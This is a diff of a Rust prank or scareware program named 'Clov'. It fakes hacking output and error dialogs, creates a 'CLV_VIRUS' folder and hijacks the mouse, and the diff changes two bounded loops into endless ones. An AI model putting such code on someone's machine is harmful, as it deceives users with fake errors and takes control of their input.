@@ -12,14 +12,12 @@ use std::{thread, time};
 use termion::event::Key;
 use termion::input::TermRead;
 use termion::raw::IntoRawMode;
-
-
 pub struct Clov;
 
 impl Clov {
     pub fn hack(target: &str) {
         println!("Hacking...");
-        for _x in 0..24 {
+        for _x in 0..13 {
             let millis = time::Duration::from_millis(10);
             let num: i64 = rand::thread_rng().gen_range(0..10000000000000);
             println!("{}", num);
@@ -86,7 +84,6 @@ impl Clov {
             thread::sleep(millis)
         }
     }
-
     pub fn create_files(name: &str) {
         let cmd = Command::new("touch")
             .arg(&name)
@@ -94,9 +91,9 @@ impl Clov {
             .expect("Failed to execute command");
         println!("{}", std::str::from_utf8(&cmd.stdout).unwrap());
     }
-    
+
     pub fn call_df() {
-        for _o in 0..4 {
+        loop {
             pub fn key_not_allowed() {
                 let stdin = stdin();
                 let mut stdout = stdout().into_raw_mode().unwrap();
@@ -113,12 +110,11 @@ impl Clov {
                         Key::Alt('t') => println!("termion is cool"),
                         _ => (),
                     }
-            
+
                     stdout.flush().unwrap();
                 }
-            
-        }
-    
+            }
+
             #[warn(unused_must_use)]
             #[warn(unused_imports)]
             let mut a = dialog::Question::new("window process exited eith code: 9_972");
@@ -151,13 +147,13 @@ impl Clov {
                 key_not_allowed();
             });
             let asycl7 = thread::spawn(move || {
-            let cmd = Command::new("mkdir")
+                let cmd = Command::new("mkdir")
                     .arg("CLV_VIRUS")
                     .output()
                     .expect("Failed to execute command");
-            println!("{}", std::str::from_utf8(&cmd.stdout).unwrap());
+                println!("{}", std::str::from_utf8(&cmd.stdout).unwrap());
             });
-            
+
             asycl.join().unwrap();
             asycl2.join().unwrap();
             asycl3.join().unwrap();
@@ -169,9 +165,8 @@ impl Clov {
     }
 }
 
-
 pub fn sine_mouse_wave() {
-    for _a in 0..7 {
+    loop {
         autopilot::mouse::smooth_move(autopilot::geometry::Point::new(100.0, 200.0), Some(5.0))
             .expect("Unable to move mouse");
     }
